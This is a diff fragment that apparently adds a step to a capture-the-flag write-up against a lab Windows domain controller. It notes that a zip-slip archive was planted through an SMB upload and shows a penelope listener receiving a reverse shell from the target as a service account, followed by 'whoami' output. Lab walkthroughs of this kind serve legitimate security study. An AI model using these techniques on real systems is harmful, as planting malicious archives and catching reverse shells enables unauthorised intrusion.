@@ -387,5 +387,22 @@ In this case ill use penelope
 ```python
 smb: \> put samples.zip
 ```
+This planted the zipslip
 
+```python
+penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.231 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => BRUNODC 10.129.238.9 Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 👤 bruno\svc_scan 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/ethan/.penelope/sessions/BRUNODC~10.129.238.9-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_03_28-21_50_08-719.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32>whoami
+whoami
+bruno\svc_scan
+
+C:\Windows\system32>
+
+```
 
